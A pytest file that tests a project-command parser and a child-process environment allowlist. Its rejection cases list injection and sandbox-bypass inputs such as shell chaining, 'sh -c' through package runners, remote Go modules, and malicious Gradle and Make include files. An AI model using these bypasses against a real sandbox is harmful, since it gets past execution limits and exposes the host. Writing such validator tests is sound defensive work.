from __future__ import annotations

from pathlib import Path

import pytest

from app.application.project_command import (
    ProjectCommandError,
    build_project_child_env,
    parse_project_command,
    parse_project_setup_commands,
)


@pytest.fixture
def project_root(tmp_path: Path) -> Path:
    (tmp_path / "frontend").mkdir()
    (tmp_path / "backend").mkdir()
    (tmp_path / "backend" / "requirements.txt").write_text("fastapi\n", encoding="utf-8")
    (tmp_path / "server.py").write_text("print('ready')\n", encoding="utf-8")
    script = tmp_path / "dev-local.sh"
    script.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    script.chmod(0o700)
    return tmp_path


@pytest.mark.parametrize(
    ("command", "argv", "relative_cwd"),
    [
        ("npm run dev", ("npm", "run", "dev"), "."),
        ("pnpm --filter web dev", ("pnpm", "--filter", "web", "dev"), "."),
        ("yarn run dev", ("yarn", "run", "dev"), "."),
        ("bun run dev", ("bun", "run", "dev"), "."),
        ("npx --no-install vite", ("npx", "--no-install", "vite"), "."),
        ("docker compose up --watch", ("docker", "compose", "up", "--watch"), "."),
        ("cargo run", ("cargo", "run"), "."),
        ("go run .", ("go", "run", "."), "."),
        ("mvn spring-boot:run", ("mvn", "spring-boot:run"), "."),
        ("gradle bootRun", ("gradle", "bootRun"), "."),
        ("make dev", ("make", "dev"), "."),
        ("python3 -u server.py", ("python3", "-u", "server.py"), "."),
        ("./dev-local.sh", ("./dev-local.sh",), "."),
        ("cd frontend && npm run dev", ("npm", "run", "dev"), "frontend"),
    ],
)
def test_parse_project_command_accepts_structured_dev_commands(
    project_root: Path,
    command: str,
    argv: tuple[str, ...],
    relative_cwd: str,
) -> None:
    parsed = parse_project_command(command, project_root)

    assert parsed.argv == argv
    assert parsed.cwd == (project_root / relative_cwd).resolve()
    assert parsed.display == command


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        ("python -c 'print(1)'", "interpreter_inline_code_not_allowed"),
        ("sh -c 'npm run dev'", "interpreter_inline_code_not_allowed"),
        ("node -e 'console.log(1)'", "interpreter_inline_code_not_allowed"),
        ("npm run dev | tee run.log", "shell_syntax_not_allowed"),
        ("npm run dev > run.log", "shell_syntax_not_allowed"),
        ("npm run dev &", "shell_syntax_not_allowed"),
        ("npm run dev; id", "shell_syntax_not_allowed"),
        ("npm run $(printf dev)", "shell_syntax_not_allowed"),
        ("npm run `printf dev`", "shell_syntax_not_allowed"),
        ("FOO=bar npm run dev", "executable_not_allowed"),
        ("npm publish", "package_command_not_allowed"),
        ("docker ps", "docker_command_not_allowed"),
        ("cd /tmp && npm run dev", "cwd_outside_project"),
        ("cd .. && npm run dev", "cwd_outside_project"),
        ("npm run dev && npm run other", "shell_syntax_not_allowed"),
        ("python -m pip install -r requirements.txt", "python_module_not_allowed"),
        ("npx sh -c 'id'", "package_command_not_allowed"),
        ("npm exec -- sh -c 'id'", "package_command_not_allowed"),
        ("npm explore foo -- sh -c 'id'", "package_command_not_allowed"),
        ("pnpm exec sh -c 'id'", "package_command_not_allowed"),
        ("yarn node -e 'process.exit(0)'", "package_command_not_allowed"),
        ("bun -e 'console.log(1)'", "interpreter_inline_code_not_allowed"),
        ("bun --eval='console.log(1)'", "interpreter_inline_code_not_allowed"),
        ("npx vite", "package_download_not_allowed"),
        ("cargo install ripgrep", "cargo_command_not_allowed"),
        ("go run example.com/evil@latest", "go_remote_module_not_allowed"),
        (
            "mvn org.codehaus.mojo:exec-maven-plugin:3.5.0:exec -Dexec.executable=sh",
            "maven_exec_not_allowed",
        ),
        ("gradle -I/tmp/evil.gradle bootRun", "gradle_init_script_not_allowed"),
        ("make '--eval=include /tmp/evil.mk' test", "make_injection_not_allowed"),
        ("make -I/tmp test", "make_injection_not_allowed"),
        ("npm --prefix /tmp run dev", "cwd_outside_project"),
        ("pnpm --dir /tmp dev", "cwd_outside_project"),
        ("yarn --cwd /tmp dev", "cwd_outside_project"),
        ("make -C /tmp", "cwd_outside_project"),
        ("mvn -f /tmp/pom.xml spring-boot:run", "cwd_outside_project"),
        ("gradle -p /tmp bootRun", "cwd_outside_project"),
        ("go -C /tmp run .", "cwd_outside_project"),
        ("uvicorn --app-dir /tmp app:app", "cwd_outside_project"),
        ("python -m http.server --directory /tmp", "cwd_outside_project"),
        ("docker compose -f /tmp/compose.yml up", "cwd_outside_project"),
        ("docker compose --project-directory /tmp up", "cwd_outside_project"),
        ("docker compose run up", "docker_command_not_allowed"),
    ],
)
def test_parse_project_command_rejects_shell_and_capability_bypasses(
    project_root: Path,
    command: str,
    reason: str,
) -> None:
    with pytest.raises(ProjectCommandError) as caught:
        parse_project_command(command, project_root)

    assert caught.value.reason == reason


def test_parse_project_command_rejects_symlinked_cwd_outside_project(
    project_root: Path,
    tmp_path_factory: pytest.TempPathFactory,
) -> None:
    outside = tmp_path_factory.mktemp("outside-project-command")
    (project_root / "outside").symlink_to(outside, target_is_directory=True)

    with pytest.raises(ProjectCommandError) as caught:
        parse_project_command("cd outside && npm run dev", project_root)

    assert caught.value.reason == "cwd_outside_project"


def test_project_child_env_is_an_explicit_allowlist() -> None:
    child = build_project_child_env(
        {
            "PATH": "/bin",
            "HOME": "/home/test",
            "LANG": "en_US.UTF-8",
            "CONSOLE_AUTH_TOKEN": "console-secret",
            "OPENAI_API_KEY": "model-secret",
            "ANTHROPIC_API_KEY": "model-secret-2",
            "AWS_SECRET_ACCESS_KEY": "cloud-secret",
            "SSH_AUTH_SOCK": "/tmp/agent.sock",
            "SQLITE_DB_PATH": "/tmp/console.db",
            "CODEX_WORKSPACE_ROOT": "/tmp/workspaces",
            "UNRELATED_APP_SECRET": "secret",
        }
    )

    assert child == {
        "PATH": "/bin",
        "HOME": "/home/test",
        "LANG": "en_US.UTF-8",
        "PYTHONUNBUFFERED": "1",
    }


def test_parse_project_setup_commands_accepts_structured_install_batch(
    project_root: Path,
) -> None:
    commands = parse_project_setup_commands(
        "(cd frontend && npm install) && "
        "(cd backend && python -m pip install -r requirements.txt)",
        project_root,
    )

    assert [(command.argv, command.cwd) for command in commands] == [
        (("npm", "install"), (project_root / "frontend").resolve()),
        (
            ("python", "-m", "pip", "install", "-r", "requirements.txt"),
            (project_root / "backend").resolve(),
        ),
    ]


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        ("npm install | tee install.log", "shell_syntax_not_allowed"),
        ("npm install > install.log", "shell_syntax_not_allowed"),
        ("npm install; id", "shell_syntax_not_allowed"),
        ("npm install &&", "no_setup_command"),
        ("npm publish", "setup_package_command_not_allowed"),
        ("npm run install", "setup_package_command_not_allowed"),
        ("npm exec install", "setup_package_command_not_allowed"),
        ("npm install --prefix /tmp/out", "setup_path_override_not_allowed"),
        ("python -c 'print(1)'", "setup_python_command_not_allowed"),
        ("sh -c 'npm install'", "interpreter_inline_code_not_allowed"),
        ("cd .. && npm install", "cwd_outside_project"),
        ("python -m pip install -r ../../requirements.txt", "setup_path_override_not_allowed"),
        ("npm install https://example.com/pkg.tgz", "setup_remote_url_not_allowed"),
    ],
)
def test_parse_project_setup_commands_rejects_capability_bypasses(
    project_root: Path,
    command: str,
    reason: str,
) -> None:
    with pytest.raises(ProjectCommandError) as caught:
        parse_project_setup_commands(command, project_root)

    assert caught.value.reason == reason
